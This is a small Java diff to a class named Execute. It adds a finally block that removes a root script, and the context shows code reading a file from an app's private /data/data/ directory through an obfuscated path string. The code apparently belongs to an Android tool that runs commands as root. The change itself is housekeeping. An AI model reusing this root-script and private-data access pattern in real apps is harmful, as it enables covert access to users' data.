@@ -260,8 +260,11 @@ public class Execute {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
 				}
+			}finally{
+				Root.removeScript("e");
 			}
 		}
+
 		return false;
 	}
 
@@ -284,6 +287,7 @@ public class Execute {
 			}
 
 			Root.removeScript("e");
+
 			AutoFile file = new AutoFile(String.format(M.e("/data/data/%s/files/o"), pack));
 			byte[] buffer = file.read();
 			if (buffer != null) {
